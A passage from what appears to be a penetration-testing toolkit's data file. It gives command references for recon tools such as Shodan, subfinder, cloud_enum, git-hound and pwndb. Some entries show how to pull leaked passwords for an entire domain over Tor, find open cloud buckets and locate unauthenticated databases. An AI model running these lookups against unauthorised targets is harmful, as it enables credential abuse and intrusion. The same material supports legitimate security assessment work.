        "brief": "Metabigor gathers intelligence — ASNs, netblocks, related organisations, and certificate data — from public sources without needing any API keys, which makes it a quick, dependency-light way to expand a target's IP footprint. It reads targets on stdin and is built to chain with other recon tools.",
        "quickReference": [
          {
            "label": "Org name to netblocks",
            "cmd": "echo \"target\" | metabigor net --org"
          },
          {
            "label": "ASN to ranges",
            "cmd": "echo \"AS12345\" | metabigor net --asn"
          },
          {
            "label": "Search by IP",
            "cmd": "echo \"1.2.3.4\" | metabigor net --ip"
          },
          {
            "label": "Port/service data for an IP",
            "cmd": "echo \"1.2.3.4\" | metabigor ip -o result.txt"
          }
        ],
        "sections": [
          {
            "title": "Subcommands",
            "type": "table",
            "columns": [
              "Command",
              "Purpose"
            ],
            "rows": [
              [
                "net --org",
                "Resolve an organisation name to its announced netblocks"
              ],
              [
                "net --asn",
                "List the IP ranges an ASN announces"
              ],
              [
                "net --ip",
                "Find the ASN/owner that an IP belongs to"
              ],
              [
                "related",
                "Discover related organisations/domains"
              ],
              [
                "cert",
                "Pull certificate-transparency data for a target"
              ],
              [
                "ip",
                "Query open ports/services for an IP (scrapes public scan data)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "All subcommands read targets on stdin — echo or cat into metabigor and pipe the output onward.",
              "No API keys are required, which makes it ideal for a fast first pass; cross-check its netblocks against bgp.he.net and asnlookup before scanning.",
              "Always confirm a discovered range actually belongs to the target — shared and cloud ASNs contain unrelated assets you must not touch."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Organisation to netblocks",
                "cmd": "echo \"Target Corp\" | metabigor net --org"
              },
              {
                "label": "ASN to IP ranges",
                "cmd": "echo \"AS12345\" | metabigor net --asn"
              },
              {
                "label": "IP to owning ASN / org",
                "cmd": "echo \"1.2.3.4\" | metabigor net --ip"
              },
              {
                "label": "Related orgs & certificate pivots",
                "cmd": "echo \"target.com\" | metabigor related -s cert"
              },
              {
                "label": "Ranges straight into a scanner",
                "cmd": "echo \"Target Corp\" | metabigor net --org | awk '{print $1}' | naabu"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Metabigor — GitHub",
                "url": "https://github.com/j3ssie/metabigor"
              }
            ]
          }
        ]
      },
      {
        "id": "cloud-enum",
        "name": "cloud_enum",
        "url": "https://github.com/initstring/cloud_enum",
        "description": "Enumerate public AWS, Azure, and GCP assets for a keyword.",
        "brief": "cloud_enum guesses and validates cloud resources — S3 buckets, Azure blobs/containers/websites, and GCP buckets and apps — named after a keyword, flagging which exist and which are publicly readable or writable. Open or listable storage is a common source of leaked files, backups, and credentials, so this is a high-yield check whenever a target uses cloud infrastructure.",
        "quickReference": [
          {
            "label": "Scan a keyword across all three clouds",
            "cmd": "cloud_enum -k targetcompany"
          },
          {
            "label": "Multiple keywords",
            "cmd": "cloud_enum -k target -k target-corp -k targetapp"
          },
          {
            "label": "From a keyword file, log results",
            "cmd": "cloud_enum -kf keywords.txt -l results.txt"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-k <keyword>",
                "Keyword to base guesses on (repeatable)"
              ],
              [
                "-kf <file>",
                "Read keywords from a file"
              ],
              [
                "-m <file>",
                "Custom mutation wordlist (appended to each keyword)"
              ],
              [
                "-l <file>",
                "Log output to a file"
              ],
              [
                "-t <n>",
                "Threads"
              ],
              [
                "--disable-aws / --disable-azure / --disable-gcp",
                "Limit which clouds are checked"
              ],
              [
                "-qs",
                "Quick scan (skip the slower extra checks)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Seed keywords from the real naming scheme: company, product, and the -assets/-backups/-dev/-prod suffixes teams actually use.",
              "A found-but-protected bucket is still useful intel; a publicly readable or writable one is a finding — follow up per the Cloud Storage Misconfiguration write-up.",
              "Pair discovered bucket names with the aws/gsutil/az CLIs (--no-sign-request) to test list/read/write precisely.",
              "Add a mutation wordlist (-m) to catch environment- and region-suffixed names."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "All three clouds for a keyword",
                "cmd": "cloud_enum -k targetcompany"
              },
              {
                "label": "Multiple keywords + mutations, logged",
                "cmd": "cloud_enum -k target -k target-corp -m mutations.txt -l out.txt"
              },
              {
                "label": "AWS only (faster)",
                "cmd": "cloud_enum -k target --disable-azure --disable-gcp"
              },
              {
                "label": "From a keyword file",
                "cmd": "cloud_enum -kf keywords.txt -t 10 -l results.txt"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "cloud_enum — GitHub",
                "url": "https://github.com/initstring/cloud_enum"
              }
            ]
          }
        ]
      },
      {
        "id": "pwndb",
        "name": "pwndb",
        "url": "https://github.com/davidtavarez/pwndb",
        "description": "Search leaked-credential dumps for a target's emails or domain (over Tor).",
        "brief": "pwndb queries a leaked-credentials database (reachable through Tor) for accounts belonging to an email or an entire domain, surfacing passwords already exposed in past breaches. Check this before any brute-force — a known password is faster and quieter.",
        "quickReference": [
          {
            "label": "Single account",
            "cmd": "python3 pwndb.py --target user@target.com"
          },
          {
            "label": "Whole domain",
            "cmd": "python3 pwndb.py --target @target.com"
          },
          {
            "label": "From a list, save results",
            "cmd": "python3 pwndb.py --list emails.txt --output creds.txt"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "--target <email|@domain>",
                "Search a single account, or an entire domain with @domain"
              ],
              [
                "--list <file>",
                "Read many targets from a file"
              ],
              [
                "--output <file>",
                "Write the recovered records to a file"
              ],
              [
                "--proxy <host:port>",
                "Tor SOCKS proxy (default 127.0.0.1:9050)"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Single account",
                "cmd": "python3 pwndb.py --target user@target.com"
              },
              {
                "label": "Whole domain",
                "cmd": "python3 pwndb.py --target @target.com"
              },
              {
                "label": "From a list, save results",
                "cmd": "python3 pwndb.py --list emails.txt --output creds.txt"
              },
              {
                "label": "Custom Tor port (e.g. Tor Browser)",
                "cmd": "python3 pwndb.py --target @target.com --proxy 127.0.0.1:9150"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Requires Tor running locally (the service is a hidden service).",
              "Only use recovered credentials against systems you are authorised to test."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "pwndb — GitHub (davidtavarez)",
                "url": "https://github.com/davidtavarez/pwndb"
              },
              {
                "label": "Toolkit — Have I Been Pwned (corroborate)",
                "url": "tool-detail.html?tool=haveibeenpwned"
              }
            ]
          }
        ]
      },
      {
        "id": "git-hound",
        "name": "git-hound",
        "url": "https://github.com/tillson/git-hound",
        "description": "Find exposed secrets across GitHub with pattern matching.",
        "brief": "git-hound searches GitHub code across the whole platform (not just a single org) for secrets tied to a target, using regex rules plus commit and file digging to catch keys that were committed and later 'removed' but remain in history. It is aimed at surfacing leaked credentials, internal hostnames, and config at scale, and scores results to cut false positives.",
        "quickReference": [
          {
            "label": "Search by domain, dig deep",
            "cmd": "echo \"target.com\" | git-hound --dig-files --dig-commits"
          },
          {
            "label": "From a subdomain list",
            "cmd": "git-hound --subdomain-file subs.txt"
          },
          {
            "label": "Custom regex rules + results file",
            "cmd": "git-hound --regex-file rules.txt --results-only results.txt"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "(stdin)",
                "Query/keyword(s) to search, piped in on stdin"
              ],
              [
                "--dig-files",
                "Also search the full content of matching files"
              ],
              [
                "--dig-commits",
                "Dig through commit history (catches 'removed' secrets)"
              ],
              [
                "--regex-file <file>",
                "Use a custom regex ruleset"
              ],
              [
                "--subdomain-file <file>",
                "Search using a list of subdomains as queries"
              ],
              [
                "--many-results",
                "Page past GitHub's default result cap"
              ],
              [
                "--results-only <file>",
                "Write just the hits to a file"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Requires a logged-in GitHub session/token — read the repo's current auth setup, as GitHub code-search access has changed over time.",
              "Run it alongside trufflehog/gitleaks (which scan a known repo/history) — git-hound's strength is DISCOVERING unknown repos across the platform that mention your target.",
              "Validate every hit by hand and rotate any confirmed live secret immediately; treat exposed keys as compromised.",
              "Tune the regex file to your target's key formats to cut noise."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Deep dig a domain",
                "cmd": "echo \"target.com\" | git-hound --dig-files --dig-commits --many-results"
              },
              {
                "label": "From a subdomain list",
                "cmd": "git-hound --subdomain-file subs.txt"
              },
              {
                "label": "Custom regex rules to a results file",
                "cmd": "git-hound --regex-file rules.txt --results-only results.txt"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "git-hound — GitHub",
                "url": "https://github.com/tillson/git-hound"
              }
            ]
          }
        ]
      },
      {
        "id": "gitdorks-go",
        "name": "gitdorks_go",
        "url": "https://github.com/damit5/gitdorks_go",
        "description": "Automate GitHub dorking with a curated dork list to find leaked info.",
        "brief": "gitdorks_go runs a list of GitHub search dorks against a target org or keyword, automating the tedious manual dorking that turns up credentials, internal hostnames, and config files in public repositories.",
        "quickReference": [
          {
            "label": "Dork an organisation",
            "cmd": "gitdorks_go -gd dorks.txt -nws 20 -target target -tf tokens.txt"
          },
          {
            "label": "Dork a domain",
            "cmd": "gitdorks_go -gd dorks.txt -target target.com -tf tokens.txt"
          },
          {
            "label": "Broader dork set",
            "cmd": "gitdorks_go -gd Dorks/medium_dorks.txt -target target.com -tf tokens.txt -ew 3"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-gd <file>",
                "GitHub dorks file to run (e.g. Dorks/smalldorks.txt)"
              ],
              [
                "-target <org|domain>",
                "Target organisation name or domain to search for"
              ],
              [
                "-tf <file>",
                "File of GitHub API tokens (rotated to beat rate limits)"
              ],
              [
                "-token <t>",
                "A single GitHub token instead of a file"
              ],
              [
                "-nws <n>",
                "Number of concurrent searches"
              ],
              [
                "-ew <n>",
                "Expand the wordlist / dork breadth (level)"
              ],
              [
                "-o <file>",
                "Write matches to a file"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Dork an organisation",
                "cmd": "gitdorks_go -gd Dorks/smalldorks.txt -nws 20 -target target -tf tokens.txt"
              },
              {
                "label": "Dork a domain (broader)",
                "cmd": "gitdorks_go -gd Dorks/medium_dorks.txt -target target.com -tf tokens.txt -ew 3"
              },
              {
                "label": "Triage, then verify a hit",
                "cmd": "# review each result URL by hand, then confirm the live secret with\n# git-hound --dig-commits  or  trufflehog git <repo> --only-verified"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Needs one or more GitHub personal access tokens to avoid rate limiting.",
              "Validate every hit by hand — dorks are noisy and produce false positives."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "gitdorks_go — GitHub (damit5)",
                "url": "https://github.com/damit5/gitdorks_go"
              },
              {
                "label": "Toolkit — git-hound (code-search companion)",
                "url": "tool-detail.html?tool=git-hound"
              },
              {
                "label": "External Red Team Workflow",
                "url": "external-red-team-workflow.html"
              }
            ]
          }
        ]
      },
      {
        "id": "spoofcheck",
        "name": "spoofcheck",
        "url": "https://github.com/BishopFox/spoofcheck",
        "description": "Check whether a domain's SPF and DMARC records allow email spoofing.",
        "brief": "spoofcheck evaluates a domain's SPF and DMARC records and reports a clear verdict on whether mail can be spoofed as that domain. A missing SPF, a soft/neutral SPF (~all / ?all), or a DMARC policy of p=none means a forged From: will not be rejected — enabling convincing phishing from the organisation's own name. It is the fast, scriptable complement to a manual dig of the records.",
        "quickReference": [
          {
            "label": "Check a domain",
            "cmd": "python spoofcheck.py target.com"
          },
          {
            "label": "Manual cross-check",
            "cmd": "dig +short TXT target.com | grep spf1 ; dig +short TXT _dmarc.target.com"
          },
          {
            "label": "Bulk over a list",
            "cmd": "for d in $(cat domains.txt); do python spoofcheck.py \"$d\"; done"
          }
        ],
        "sections": [
          {
            "title": "What It Checks",
            "type": "table",
            "columns": [
              "Record",
              "Spoofable when"
            ],
            "rows": [
              [
                "SPF",
                "Missing, or ends in ~all / ?all / +all instead of -all"
              ],
              [
                "SPF lookups",
                "Record is present but broken (10+ DNS lookups, permerror)"
              ],
              [
                "DMARC",
                "Missing, or policy p=none (monitor only)"
              ],
              [
                "DMARC subdomain",
                "sp= is absent/none, leaving subdomains spoofable"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "It is a Python 2 script historically — run with the interpreter the repo specifies, or just cross-check the records manually with dig.",
              "A 'spoofable' verdict maps directly onto the Spoofable Email (SPF/DKIM/DMARC) write-up — use that for impact and remediation wording.",
              "Checking is entirely passive (DNS lookups only), so it is safe to run against any in-scope domain.",
              "Remember DMARC enforcement (quarantine/reject) is what actually blocks spoofing; p=none only reports."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Check one domain",
                "cmd": "python spoofcheck.py target.com"
              },
              {
                "label": "Manual cross-check (SPF + DMARC)",
                "cmd": "dig +short TXT target.com | grep spf1\ndig +short TXT _dmarc.target.com"
              },
              {
                "label": "Bulk over a list",
                "cmd": "for d in $(cat domains.txt); do echo \"== $d ==\"; python spoofcheck.py \"$d\"; done"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "spoofcheck — GitHub",
                "url": "https://github.com/BishopFox/spoofcheck"
              }
            ]
          }
        ]
      },
      {
        id: "hunter-io",
        name: "Hunter.io",
        url: "https://hunter.io/",
        description: "Discovers a company's email naming convention and verifies specific addresses.",
        brief: "Hunter.io is a web-based OSINT tool for figuring out how an organization structures its email addresses and checking whether a specific address is real — useful groundwork before any phishing-risk assessment or further people-focused recon.",
        quickReference: [
          { label: "Learn a domain's email pattern", cmd: "hunter.io/domain-search — enter a domain" },
          { label: "Guess a specific person's address", cmd: "hunter.io/email-finder — enter a name + domain" },
          { label: "Check if an address is real", cmd: "hunter.io/email-verifier — enter the address" },
          { label: "Same lookups via API", cmd: "api.hunter.io/v2/domain-search?domain=example.com&api_key=<key>" }
        ],
        sections: [
          {
            title: "Domain Search",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What it returns", "The dominant email pattern for a domain (e.g. {first}.{last}@), a list of discovered addresses, and their sources"],
              ["Confidence per result", "Each discovered address includes a confidence score based on where it was found"],
              ["Typical use", "Run this first, before anything else — it tells you the naming convention everything else relies on"]
            ]
          },
          {
            title: "Email Finder",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Input required", "A person's name plus the target domain"],
              ["Output", "A best-guess address built from the domain's known pattern, plus a confidence score"],
              ["Limitation", "It's a pattern-based guess, not a confirmed mailbox — verify before relying on it"]
            ]
          },
          {
            title: "Email Verifier",
            type: "table",
            columns: ["Status", "Meaning"],
            rows: [
              ["valid", "The address is confirmed deliverable"],
              ["invalid", "The address does not exist"],
              ["accept-all", "The domain's mail server accepts everything — a specific address can't be confirmed this way"],
              ["unknown", "Verification was inconclusive"]
            ]
          },
          {
            title: "Confidence Scores",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What the score means", "How reliable the sources are that this specific address is correct — not a guarantee"],
              ["Low-confidence hits", "Cross-verify through a second method (e.g. company site, LinkedIn) before using in a report"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Typical OSINT workflow", cmd: "1. Domain Search on the target domain — learn the naming pattern\n2. Email Finder for each named person of interest\n3. Email Verifier on every candidate address\n4. Cross-check names against LinkedIn / the company site" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier has a monthly search limit — budget lookups instead of burning them on exploratory queries.",
              "Treat every result as a lead, not a confirmed contact — verify through a second method before it goes in a report.",
              "An accept-all domain makes verification unreliable by nature — flag this explicitly rather than reporting a confidence score at face value."
            ]
          }
        ]
      },
      {
        id: "theharvester",
        name: "theHarvester",
        url: "https://github.com/laramies/theHarvester",
        description: "Gathers emails, subdomains, hosts, and names for a domain from public sources.",
        brief: "theHarvester is the classic first-move OSINT collector: give it a domain and it queries dozens of public sources — search engines, certificate transparency logs, DNS datasets, and paid API providers — to return emails, subdomains, hosts, IPs, and employee names.\n\nIt's a breadth tool, not a depth tool. The point is to build the initial picture of an organisation's footprint in one command, then hand the interesting pieces to a focused tool (Amass for subdomains, Hunter.io for email patterns, Shodan for exposed services).",
        quickReference: [
          { label: "All free sources against a domain", cmd: "theHarvester -d example.com -b all" },
          { label: "Single source, capped results", cmd: "theHarvester -d example.com -b crtsh -l 500" },
          { label: "List every available source", cmd: "theHarvester -d example.com -b \"\"" },
          { label: "Save HTML + JSON report", cmd: "theHarvester -d example.com -b all -f report" },
          { label: "Resolve and port-scan what it finds", cmd: "theHarvester -d example.com -b all -n -c" }
        ],
        sections: [
          {
            title: "Core Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain or company name — the only required argument"],
              ["-b <source>", "Data source to query; 'all' runs every configured source"],
              ["-l <n>", "Limit the number of results pulled per source (default 500)"],
              ["-S <n>", "Start at result number n — useful for paging past what you already collected"],
              ["-f <name>", "Write results to <name>.html, <name>.json and <name>.xml"],
              ["-p", "Enable Shodan lookups on discovered hosts (needs an API key)"]
            ]
          },
          {
            title: "Free Sources",
            type: "table",
            columns: ["Source", "What it provides"],
            rows: [
              ["crtsh", "Certificate transparency logs — the single most reliable free subdomain source"],
              ["duckduckgo", "Search-engine results; no API key, rarely rate-limited"],
              ["baidu / yahoo", "Alternate search engines — occasionally surface pages Google has dropped"],
              ["anubis", "Aggregated subdomain dataset from JonLuca's Anubis-DB"],
              ["hackertarget", "Free DNS/host lookups, generous but rate-limited"],
              ["otx", "AlienVault Open Threat Exchange passive DNS"],
              ["rapiddns", "Passive DNS index, good subdomain coverage"],
              ["threatminer", "Passive DNS and WHOIS aggregation"],
              ["urlscan", "Historical page scans — often exposes internal-looking hostnames"],
              ["dnsdumpster", "DNS records and host mapping"],
              ["sublist3r", "Wraps several public subdomain aggregators"],
              ["certspotter", "Second certificate transparency feed, distinct coverage from crtsh"]
            ]
          },
          {
            title: "API-Key Sources",
            type: "table",
            columns: ["Source", "Notes"],
            rows: [
              ["shodan", "Exposed services and banners for discovered IPs — the highest-value paid source"],
              ["securitytrails", "Deep historical DNS and subdomain data; free tier is small"],
              ["hunter", "Email addresses and the domain's naming pattern"],
              ["censys", "Certificate and host data; free tier allows a modest query budget"],
              ["virustotal", "Passive DNS resolutions and related domains"],
              ["github-code", "Searches public GitHub code for the domain — finds leaked hostnames and endpoints"],
              ["intelx", "Intelligence X archive; includes leaked and pastebin material"],
              ["fullhunt / bevigil / zoomeye", "Attack-surface datasets, each with a free API tier"],
              ["Key file location", "~/.theHarvester/api-keys.yaml — copy the template from the repo and fill in what you have"]
            ]
          },
          {
            title: "Post-Processing",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-n", "DNS-resolve every discovered host to an IP"],
              ["-c", "DNS brute-force additional subdomains against the domain"],
              ["-t", "Attempt DNS zone-transfer / takeover checks on discovered hosts"],
              ["-r", "Reverse-DNS the IP range around discovered hosts"],
              ["-s", "Shodan-query every resolved IP (requires -p style key config)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Baseline sweep of an unfamiliar organisation", cmd: "theHarvester -d example.com -b all -l 1000 -f baseline\n# review baseline.html, then feed the subdomain list onward:\njq -r '.hosts[]' baseline.json | cut -d: -f1 | sort -u > hosts.txt" },
              { label: "Free-only run (no API keys configured)", cmd: "theHarvester -d example.com -b crtsh,duckduckgo,anubis,rapiddns,otx,certspotter -l 1000 -f free" },
              { label: "Enrich results with resolution and scanning", cmd: "theHarvester -d example.com -b all -n -c -f enriched\n# then port-scan the live hosts with nmap:\nnmap -sV -iL hosts.txt -oA harvest_scan" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Run it inside a virtualenv or via the Docker image — the dependency list churns and a system-wide install breaks easily.",
              "'-b all' will fail loudly on every source you have no key for; those errors are noise, not a broken install.",
              "Email results are frequently stale or scraped from unrelated pages. Verify each one before it reaches a report.",
              "Search-engine sources get rate-limited fast. If results suddenly drop to zero, wait rather than retrying in a loop.",
              "Treat the output as leads to confirm, not as an inventory — theHarvester is deliberately broad and noisy."
            ]
          }
        ]
      },
      {
        id: "subfinder",
        name: "Subfinder",
        url: "https://github.com/projectdiscovery/subfinder",
        description: "Fast passive subdomain discovery built for piping into other tools.",
        brief: "Subfinder is ProjectDiscovery's passive subdomain enumerator: it queries a large set of online sources and returns valid subdomains, fast, with no traffic to the target. It does one thing and is designed to be the first stage of a pipeline — its output flows straight into httpx, dnsx, or nuclei.\n\nWhere Amass is thorough and slow, subfinder is quick and clean. Most workflows run both and merge the results.",
        quickReference: [
          { label: "Enumerate a domain", cmd: "subfinder -d example.com" },
          { label: "Silent output for piping", cmd: "subfinder -d example.com -silent" },
          { label: "Use every source, including slow ones", cmd: "subfinder -d example.com -all -recursive" },
          { label: "Pipe straight into live-host probing", cmd: "subfinder -d example.com -silent | httpx -silent -title -sc" },
          { label: "Bulk mode from a domain list", cmd: "subfinder -dL domains.txt -o all_subs.txt" }
        ],
        sections: [
          {
            title: "Input",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain; comma-separate for several"],
              ["-dL <file>", "Read target domains from a file, one per line"],
              ["-exclude-sources <list>", "Skip named sources"],
              ["-s <list>", "Use only the named sources"],
              ["-all", "Query every source, including the slow ones skipped by default"],
              ["-recursive", "Use only sources that can enumerate subdomains of subdomains"]
            ]
          },
          {
            title: "Output",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-o <file>", "Write results to a file"],
              ["-oJ", "JSON Lines output, including which source found each name"],
              ["-oD <dir>", "Write one file per domain when running in bulk"],
              ["-cs", "Include the source name alongside each result"],
              ["-silent", "Print only subdomains — no banner, no status lines"],
              ["-nc", "Disable colour codes"]
            ]
          },
          {
            title: "Configuration",
            type: "table",
            columns: ["Item", "Description"],
            rows: [
              ["Provider config", "$HOME/.config/subfinder/provider-config.yaml — API keys go here, one list per provider"],
              ["Multiple keys per provider", "You can list several keys for one provider; subfinder rotates through them"],
              ["-ls", "List all available sources and which ones need keys"],
              ["High-value keys", "SecurityTrails, Censys, Shodan, VirusTotal, Chaos, GitHub — these roughly double typical coverage"]
            ]
          },
          {
            title: "Rate & Performance",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <n>", "Concurrent resolution threads (default 10)"],
              ["-rl <n>", "Global rate limit in requests per second across all sources"],
              ["-timeout <s>", "Seconds to wait before giving up on a source (default 30)"],
              ["-max-time <m>", "Hard cap in minutes on the whole enumeration"],
              ["-proxy <url>", "Route requests through an HTTP proxy"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard discovery pipeline", cmd: "subfinder -d example.com -all -silent \\\n  | httpx -silent -status-code -title -tech-detect \\\n  | tee live_hosts.txt" },
              { label: "Merge with Amass for full coverage", cmd: "subfinder -d example.com -all -silent > sub_sf.txt\namass enum -passive -d example.com -o sub_am.txt\nsort -u sub_sf.txt sub_am.txt > subdomains.txt" },
              { label: "Bulk across a scope file", cmd: "subfinder -dL in_scope.txt -all -oD ./results -silent\ncat ./results/*.txt | sort -u > all_subdomains.txt" },
              { label: "Feed a vulnerability scan", cmd: "subfinder -d example.com -silent | httpx -silent | nuclei -t exposures/ -severity medium,high,critical" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Subfinder is passive only — it never sends a request to the target. That makes it safe to run before authorisation paperwork is finalised, unlike active enumeration.",
              "Without API keys you are getting maybe half the available coverage. Filling in the free-tier keys is the single highest-value setup step.",
              "It returns names, not live hosts. Always follow with httpx or dnsx before assuming anything you found actually resolves.",
              "-all is noticeably slower but consistently finds more. Use it for real engagements and skip it for quick checks."
            ]
          }
        ]
      },
      {
        id: "shodan",
        name: "Shodan",
        url: "https://www.shodan.io/",
        description: "Search engine for internet-connected devices, banners, and exposed services.",
        brief: "Shodan continuously scans the public internet and indexes what answers: service banners, TLS certificates, HTTP headers, screenshots, ICS protocols, and more. Instead of scanning a target yourself, you query what Shodan already saw — which is both faster and completely passive from the target's perspective.\n\nIt is most useful for finding an organisation's forgotten infrastructure: the staging box nobody decommissioned, the database with no authentication, the admin panel on a non-standard port.",
        quickReference: [
          { label: "Everything Shodan knows about an IP", cmd: "shodan host 1.2.3.4" },
          { label: "Search from the CLI", cmd: "shodan search --fields ip_str,port,org 'org:\"Example Corp\"'" },
          { label: "Count results without spending credits", cmd: "shodan count \"apache country:US\"" },
          { label: "Find hosts by certificate name", cmd: "ssl.cert.subject.CN:\"example.com\"" },
          { label: "Everything in an org's netblock", cmd: "net:1.2.3.0/24" }
        ],
        sections: [
          {
            title: "Core Search Filters",
            type: "table",
            columns: ["Filter", "Description"],
            rows: [
              ["hostname:example.com", "Match hosts whose reverse DNS or banner hostname contains the string"],
              ["net:1.2.3.0/24", "Restrict to an IP range or CIDR block"],
              ["org:\"Example Corp\"", "Match the organisation registered to the IP block"],
              ["asn:AS64500", "Match everything in an autonomous system"],
              ["port:8080", "Match a specific open port"],
              ["product:nginx", "Match an identified software product"],
              ["version:\"1.18\"", "Match a specific software version — pair with product:"],
              ["os:\"Windows Server 2019\"", "Match fingerprinted operating system"],
              ["country:IN / city:\"Pune\"", "Geographic filters"]
            ]
          },
          {
            title: "Web & Certificate Filters",
            type: "table",
            columns: ["Filter", "Description"],
            rows: [
              ["http.title:\"Login\"", "Match the HTML title of the served page"],
              ["http.html:\"internal use only\"", "Match a string in the page body"],
              ["http.status:200", "Match the HTTP response code"],
              ["http.favicon.hash:<n>", "Match a favicon hash — an excellent way to fingerprint an app across unrelated IPs"],
              ["ssl.cert.subject.CN:example.com", "Match the certificate's common name — finds hosts DNS never points at"],
              ["ssl.cert.issuer.CN:\"Let's Encrypt\"", "Match by certificate issuer"],
              ["ssl.cert.expired:true", "Hosts serving an expired certificate"],
              ["ssl:\"Example Corp\"", "Free-text match anywhere in the TLS certificate"]
            ]
          },
          {
            title: "Common Exposure Searches",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["product:MongoDB port:27017", "MongoDB instances reachable from the internet"],
              ["product:Elasticsearch port:9200", "Open Elasticsearch clusters"],
              ["port:6379 product:Redis", "Exposed Redis, historically often unauthenticated"],
              ["port:3389 has_screenshot:true", "RDP endpoints with a captured login screen"],
              ["\"authentication disabled\"", "Banner text indicating an unauthenticated service"],
              ["http.title:\"Index of /\"", "Open directory listings"],
              ["port:445 os:Windows", "SMB exposed to the internet"],
              ["vuln:CVE-2021-44228", "Hosts flagged for a specific CVE (enterprise-tier filter)"]
            ]
          },
          {
            title: "CLI Reference",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["shodan init <api-key>", "Store your API key locally — do this once"],
              ["shodan host <ip>", "Full record for one IP: ports, banners, vulns, history"],
              ["shodan search <query>", "Run a search; add --fields to choose output columns"],
              ["shodan count <query>", "Return only the number of matches — costs no query credits"],
              ["shodan download <file> <query>", "Save full results as compressed JSON for offline analysis"],
              ["shodan parse --fields ip_str,port <file>", "Extract fields from a downloaded result set"],
              ["shodan stats --facets port <query>", "Aggregate a search by a facet, e.g. port distribution"],
              ["shodan domain <domain>", "DNS records and known subdomains for a domain"],
              ["shodan myip", "Print your current public IP"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Map an organisation's exposed surface", cmd: "shodan search --fields ip_str,port,product,http.title 'org:\"Example Corp\"' > exposure.txt\nshodan stats --facets port 'org:\"Example Corp\"'" },
              { label: "Find infrastructure DNS does not reveal", cmd: "# certificate CN often exposes hosts with no public DNS record\nshodan search --fields ip_str,port 'ssl.cert.subject.CN:\"example.com\"'" },
              { label: "Favicon pivot to find related assets", cmd: "# compute the target's favicon hash, then search it\nshodan search --fields ip_str,port,org 'http.favicon.hash:-1234567890'" },
              { label: "Bulk export for offline analysis", cmd: "shodan download results 'net:1.2.3.0/24'\nshodan parse --fields ip_str,port,product results.json.gz" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Searching Shodan is passive — you query their index, not the target. Connecting to anything you find is not passive, and needs authorisation.",
              "Data is a snapshot from whenever Shodan last scanned that host. Verify anything time-sensitive independently.",
              "Free accounts get very limited filters and result pages. A one-off membership unlocks most of what makes the tool useful.",
              "'shodan count' does not consume query credits — use it to refine a query before running the real search.",
              "Certificate and favicon pivots are the highest-yield techniques here: they find assets that share an owner but nothing else."
            ]
          }
        ]
      },
      {
        id: "censys",
        name: "Censys Search",
        url: "https://search.censys.io/",
        description: "Internet-wide host and certificate index with a precise query language.",
        brief: "Censys scans the internet and indexes hosts and X.509 certificates, exposing both through a structured query language. It overlaps with Shodan but differs in emphasis: Censys has the stronger certificate dataset and a more precise, field-oriented syntax, which makes it excellent for pivoting from one certificate to every other host that presents it.\n\nUse it alongside Shodan rather than instead of it — the two index different slices of the same internet.",
        quickReference: [
          { label: "Hosts serving a domain's certificate", cmd: "services.tls.certificates.leaf_data.subject_dn: *example.com*" },
          { label: "Everything in a netblock", cmd: "ip: 1.2.3.0/24" },
